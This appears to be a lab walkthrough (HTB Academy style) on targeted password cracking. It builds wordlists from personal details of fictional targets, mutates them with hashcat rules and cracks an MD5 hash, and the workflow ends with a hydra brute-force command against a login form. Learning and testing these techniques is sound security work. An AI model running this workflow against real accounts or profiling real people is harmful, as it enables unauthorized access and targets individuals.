# 🛰️ Introduction to Custom Wordlists for Password Cracking

## Overview of Techniques and Tools

This guide provides a structured approach to creating custom wordlists tailored for targeted password cracking attacks using OSINT data, username generation tools, and password profiling software. The process involves collecting relevant personal information about the target, generating potential usernames, and constructing a password list that adheres to specific security policies.

## Example Workflow: Cracking Mark White's Password

### Step 1: Create Base Wordlist
```bash
cat << EOF > password.list
Mark
White
August
1998
Nexura
Sanfrancisco
California
Bella
Maria
Alex
Baseball
EOF
```

### Step 2: Create Custom Rules
```bash
cat << EOF > custom.rule
c
C
t
\$!
\$1\$9\$9\$8
\$1\$9\$9\$8\$!
sa@
so0
ss\$
EOF
```

**Rule Explanation:**
- `c` - Capitalize first character, lowercase rest
- `C` - Lowercase first character, uppercase rest  
- `t` - Toggle case of all characters
- `$!` - Append exclamation mark
- `$1$9$9$8` - Append '1998'
- `$1$9$9\$8$!` - Append '1998!'
- `sa@` - Replace 'a' with '@'
- `so0` - Replace 'o' with '0'
- `ss$` - Replace 's' with '$'

### Step 3: Generate Mutated Wordlist
```bash
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

### Step 4: Crack the Hash
```bash
# Hash: 97268a8ae45ac7d15c3cea4ce6ea550b
hashcat -a 0 -m 0 97268a8ae45ac7d15c3cea4ce6ea550b mut_password.list
```

### Step 5: Retrieve Results
```bash
hashcat -m 0 97268a8ae45ac7d15c3cea4ce6ea550b --show
```

## HTB Academy Custom Wordlists Workflow

### Tools Installation
```bash
# Install CUPP (Common User Passwords Profiler)
sudo apt install cupp -y

# Clone username-anarchy
git clone https://github.com/urbanadventurer/username-anarchy.git
```

### Real-World Scenario: Jane Smith

**Target Information (OSINT):**
- Name: Jane Smith
- Nickname: Janey
- Birthdate: 11/12/1990
- Partner: Jim (nickname: Jimbo, DOB: 12/12/1990)
- Pet: Spot
- Company: AHI

### Step 1: Generate Username Variations
```bash
cd username-anarchy
./username-anarchy Jane Smith > ../jane_smith_usernames.txt

# Generated usernames:
# jane, jsmith, jane.smith, smith.jane, j.smith, smithj, etc.
```

### Step 2: CUPP Interactive Password Generation
```bash
cupp -i

# Interactive prompts:
# First Name: Jane  
# Surname: Smith
# Nickname: Janey
# Birthdate (DDMMYYYY): 11121990
# Partners name: Jim
# Partners nickname: Jimbo
# Partners birthdate (DDMMYYYY): 12121990
# Pet's name: Spot
# Company name: AHI
# Key words: [company-specific terms]
# Special chars at end: Y
# Random numbers at end: Y
# Leet mode: Y

# Output: jane.txt (43,222 words)
```

### Step 3: Password Complexity Filtering
```bash
# Filter for policy: 6+ chars, uppercase, lowercase, numbers, 2+ special chars
grep -E '^.{6,}$' jane.txt | \
grep -E '[A-Z]' | \
grep -E '[a-z]' | \
grep -E '[0-9]' | \
grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt

# Breakdown:
# '^.{6,}$'                - 6+ characters
# '[A-Z]'                  - At least one uppercase
# '[a-z]'                  - At least one lowercase  
# '[0-9]'                  - At least one digit
# '([!@#$%^&*].*){2,}'     - At least 2 special characters
```

### Step 4: Targeted Brute Force Attack
```bash
# HTTP POST form brute force with custom wordlists
hydra -L jane_smith_usernames.txt -P jane-filtered.txt \
      TARGET_IP -s PORT -f \
      http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"

# Expected result:
# [PORT][http-post-form] host: TARGET_IP   login: jane   password: 3n4J!!
```

### Step 5: Success and Flag Retrieval
```bash
# Login with discovered credentials
# Username: jane
# Password: 3n4J!!
# Navigate to target and retrieve flag
```

---

## Advanced Filtering Techniques

### Password Policy Compliance
```bash
# Example policies and corresponding grep filters:

# Policy: 8-16 chars, 1 upper, 1 lower, 1 digit, 1 special
grep -E '^.{8,16}$' wordlist.txt | \
grep -E '[A-Z]' | \
grep -E '[a-z]' | \
grep -E '[0-9]' | \
grep -E '[!@#$%^&*()_+=-]' > policy_compliant.txt

# Policy: No dictionary words (basic check)
grep -vE '^(password|admin|user|test|login)' wordlist.txt > no_common.txt

# Policy: Must contain company name (case insensitive)
grep -iE 'companyname' wordlist.txt > company_passwords.txt

# Policy: Must start with capital letter
grep -E '^[A-Z]' wordlist.txt > capital_start.txt
```

### Wordlist Quality Control
```bash
# Remove duplicates and sort
sort -u wordlist.txt > clean_wordlist.txt

# Remove passwords shorter than minimum length
awk 'length($0) >= 8' wordlist.txt > min_length.txt

# Count passwords by length
awk '{print length($0)}' wordlist.txt | sort -n | uniq -c

# Remove blank lines
sed '/^$/d' wordlist.txt > no_blanks.txt
```

### Targeted Attack Strategy Summary
1. **OSINT Collection** - Personal/professional information
2. **Username Generation** - username-anarchy variations  
3. **Password Profiling** - CUPP interactive generation
4. **Policy Filtering** - grep compliance checking
5. **Targeted Attack** - Hydra with custom wordlists
6. **Success Validation** - Login and objective completion 

---

[!SUCCESS] The structured approach outlined above provides a comprehensive method to create targeted, policy-compliant password lists for efficient cracking attacks.